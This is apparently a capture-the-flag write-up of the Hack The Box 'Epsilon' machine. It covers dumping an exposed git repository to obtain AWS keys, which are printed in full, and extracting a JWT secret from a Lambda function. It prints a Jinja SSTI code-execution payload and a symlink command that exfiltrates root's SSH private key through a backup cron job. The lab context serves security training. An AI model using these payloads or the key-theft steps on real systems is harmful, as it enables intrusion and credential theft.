## HTB Epsilon (Medium) - Writeup  
  
Difficulty: Medium  

AWS keys were found exposed in a git repository on the webserver.    
Using those keys, the AWS command line was exploited to access cloud functions and retrieve a secret.   
That secret was then used to exploit the site for code execution with SSTI and gain an initial shell.    
Finally, a backup script was abused to escalate to root and capture the flag.   
---

## Nmap 

#### The nmap scan revealed three open ports:  

![obraz](https://github.com/user-attachments/assets/9be0b7ea-b767-4772-b2e2-3ad9771c9b31)  


## Port 80 - Website  

![obraz](https://github.com/user-attachments/assets/bb21866c-d4c4-4a48-a7bb-996c222d7453)  

As can be seen on nmap scan this website contains .git directory.  
It can be dumped to kali using git-dumper tool.  

```
https://github.com/arthaud/git-dumper
```

![obraz](https://github.com/user-attachments/assets/b5311991-11df-42c0-a528-9eec8afa41ad)

Directory contains source code:  
![obraz](https://github.com/user-attachments/assets/dab5989f-f1b1-4dee-865f-56a910d3242d)

Good thing to start with when enumerating .git directory is to look at git commits.  
It can be done with git log command:  

![obraz](https://github.com/user-attachments/assets/56ffb6f7-25a2-4f50-8b62-799364e0c6ad)

With git diff we can compare previous commits and look at the changes done.  
One that turned out to be intresting was:  
```
git diff c622771686bd74c16ece91193d29f85b5f9ffa91 7cf92a7a09e523c1c667d13847c9ba22464412f3
```
![obraz](https://github.com/user-attachments/assets/554a21d7-594f-4890-aa4b-6c0b9beff13b)  

It exposed AWS secret key:   
+    aws_access_key_id='AQLA5M37BDN6FJP76TDC'    
+    aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A'  

I will also add cloud.epsilon.htb to /etc/hosts.  
Now I'll analyze source code and after that we can try to use aws key.  
I'll paste the code here:  
```python
#!/usr/bin/python3

import jwt
from flask import *

app = Flask(__name__)
secret = '<secret_key>'

def verify_jwt(token,key):
        try:
                username=jwt.decode(token,key,algorithms=['HS256',])['username']
                if username:
                        return True
                else:
                        return False
        except:
                return False

@app.route("/", methods=["GET","POST"])
def index():
        if request.method=="POST":
                if request.form['username']=="admin" and request.form['password']=="admin":
                        res = make_response()
                        username=request.form['username']
                        token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
                        res.set_cookie("auth",token)
                        res.headers['location']='/home'
                        return res,302
                else:
                        return render_template('index.html')
        else:
                return render_template('index.html')

@app.route("/home")
def home():
        if verify_jwt(request.cookies.get('auth'),secret):
                return render_template('home.html')
        else:
                return redirect('/',code=302)

@app.route("/track",methods=["GET","POST"])
def track():
        if request.method=="POST":
                if verify_jwt(request.cookies.get('auth'),secret):
                        return render_template('track.html',message=True)
                else:
                        return redirect('/',code=302)
        else:
                return render_template('track.html')

@app.route('/order',methods=["GET","POST"])
def order():
        if verify_jwt(request.cookies.get('auth'),secret):
                if request.method=="POST":
                        costume=request.form["costume"]
                        message = '''
                        Your order of "{}" has been placed successfully.
                        '''.format(costume)
                        tmpl=render_template_string(message,costume=costume)
                        return render_template('order.html',message=tmpl)
                else:
                        return render_template('order.html')
        else:
                return redirect('/',code=302)
app.run(debug='true')
```
There are a few routes but every one of them calls verify_jwt() function.  
This function look like this:  
```python
def verify_jwt(token,key):
        try:
                username=jwt.decode(token,key,algorithms=['HS256',])['username']
                if username:
                        return True
                else:
                        return False
        except:
                return False
```
I tried logging in to the website on port 5000 with admin:admin, but it didn’t work.  
The code must have changed since then.  
Another thing that came from reading the code is the possibility of SSTI vulnerability in /order.  
```python
@app.route('/order',methods=["GET","POST"])
def order():
        if verify_jwt(request.cookies.get('auth'),secret):
                if request.method=="POST":
                        costume=request.form["costume"]
                        message = '''
                        Your order of "{}" has been placed successfully.
                        '''.format(costume)
                        tmpl=render_template_string(message,costume=costume)
                        return render_template('order.html',message=tmpl)
                else:
                        return render_template('order.html')
        else:
                return redirect('/',code=302)
```
It takes "costume" parameter as user input and passes it to render_template_string which is a dangerous function.  


## AWS command line tool - exploitation  

I will install awscli to talk with the server, then configure secrets that we previously found in .git directory:  
![obraz](https://github.com/user-attachments/assets/39819d7c-234f-4d96-b06b-00b8d5515af1)  

We will start with listing functions:  
```
./aws lambda list-functions --profile exploit --endpoint-url http://cloud.epsilon.htb 
```

![obraz](https://github.com/user-attachments/assets/11a383e0-5e24-438a-949e-4a9836098f5f)  

There is one lambda function called "costume_shop_v1".  
To get more info about this function we can run:  
```
./aws lambda get-function --function-name costume_shop_v1 --endpoint-url http://cloud.epsilon.htb --profile exploit
```
![obraz](https://github.com/user-attachments/assets/a31e7d4c-2000-498e-bffc-0dadd6d8c4b8)

We now know the location of the source code.  
We can go to this url and download source code:  
```
http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
```
![obraz](https://github.com/user-attachments/assets/7d35087f-aa9c-4443-8d7a-a63f137f4803)

Let's unzip it and view:  
![obraz](https://github.com/user-attachments/assets/f4dfc0ca-8006-4a04-b8b2-b0d7d793e36e)


![obraz](https://github.com/user-attachments/assets/d257cb64-fc8a-479e-834d-e1febcdbd16f)

It exposed a secret:  
```
secret='RrXCv`mrNe!K!4+5`wYq'
```

It was mentioed before in website source code.  
We can encode this secret as JWT token, and use it to authenticate to the website.  

![obraz](https://github.com/user-attachments/assets/ae0642a6-86c0-4451-985b-80d6d4fc5441)

Now we have cookie value but we don't know the cookie name.    
To get cookie name we can go back to the website code:  
```python
cat server.py

[...]
token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
   res.set_cookie("auth",token)
[...]
```
Cookie is called auth, now go to website on port 5000.  
Press f12 and add a cookie named auth and paste JWT token as value.  

![obraz](https://github.com/user-attachments/assets/ae57a42b-6560-4b36-91c0-ddd7f8e3b407)



## Port 5000 - Exploiting SSTI  

Now with cookie set we can access /order directory.  
![obraz](https://github.com/user-attachments/assets/b376f5cd-1831-4999-8c1e-f05aa3bfba8d)

We can now try to exploit previously identified SSTI vulnerability.  
Server-Side Template Injection (SSTI) is a type of security vulnerability that occurs when user input is improperly handled within a server-side template engine.  
We can now catch a request with burp and then manipulate costume parameter which wouldn't be possible directly on the website.  

![obraz](https://github.com/user-attachments/assets/5ef0c091-3cd8-4a5e-b11a-31e9de0178d9)

Basic payload to test for SSTI is {{7*7}}, if it returns as 49 it means we have SSTI working.  

![obraz](https://github.com/user-attachments/assets/65c3f784-ce29-4f95-af09-54c08a7e958a)  

Now we can try to achieve code execution with this payload:  

`{{ cycler.__init__.__globals__.os.popen('id').read() }}`

It worked, let's now encode a reverse shell payload:   

![obraz](https://github.com/user-attachments/assets/7392e19a-4b87-435d-b6a5-8c9b545de562)

And now run place it into SSTI payload and start a listener.   

![obraz](https://github.com/user-attachments/assets/fa20558b-3ef3-432e-94ea-ae6bf25aef42)

We got a connection back!   

![obraz](https://github.com/user-attachments/assets/f84d488a-6870-4af4-ac00-3f9f0fe55137)



## Priv Esc  

We can retrieve a flag.  

![obraz](https://github.com/user-attachments/assets/bcac3d10-ad97-4567-a6f3-2d4dd13268da)


First thing that came to my mind was to check current application code to look for credentials.  

![obraz](https://github.com/user-attachments/assets/89959cb5-01e3-498d-91cf-47abed6ee072)

```
4d_09@fhgRTdws2
```

Unfortunately it is not reused, there is no second user.  

There are also two new ports open 4566 and 38047, I discovered it with netstat -nvlp command.  

![obraz](https://github.com/user-attachments/assets/a5292c47-3db9-46ba-bd56-a1d38f1c0563)  

I'll leave them for now and proceed to look for cron jobs with pspy64.  
```
https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1
```

![obraz](https://github.com/user-attachments/assets/98c6ec68-3da7-48c4-bd24-c1d9eac4f92c)

We successfully found some cron jobs running:  

![obraz](https://github.com/user-attachments/assets/dc86aee0-121a-4f70-882d-3afcff78dde3)

The one that is intresting to us is:  
+  /bin/bash /usr/bin/backup.sh   
+  /usr/bin/tar -cvf /opt/backups/923048034.tar /var/www/app/   

Let's take a look at this script: 

![obraz](https://github.com/user-attachments/assets/43209ad7-c094-49d3-98ed-d88308fd107b)

The second-to-last line of code contains a security risk.  
It uses tar command with -h option, meaning it will follow symlinks.  

We need to wait for checksum being created and then we can create a symlink on it to any file:  

![obraz](https://github.com/user-attachments/assets/8771fc94-f683-4b70-bf0a-001710a1b32f)

There is only 5 second window to overwrite checksum file.  
Now it will get archived into a .tar file which we can view without extracting it:  
```
tar -xOf 518221472.tar opt/backups/checksum
```

![obraz](https://github.com/user-attachments/assets/2dde95b1-b0b9-4b31-a1f0-df47cf82c2c4)

It works, now we will try to retrieve root's ssh key:  
```
ln -sf /root/.ssh/id_rsa /opt/backups/checksum
```

![obraz](https://github.com/user-attachments/assets/57c1c2f0-0bb6-4542-9c21-39a71b81fc1a)

And now we can view it:  

![obraz](https://github.com/user-attachments/assets/36cc3295-b775-42cd-83b0-48ab1f3dc8f1)

With the key we can connect via ssh:  

![obraz](https://github.com/user-attachments/assets/d7da68df-44a5-4a67-9343-d7fb80d06457)

Lastly we will retrieve a flag:  

![obraz](https://github.com/user-attachments/assets/f6b1b15a-3f05-47bb-a171-a7646d81389d)

Thank you for reading!  

































































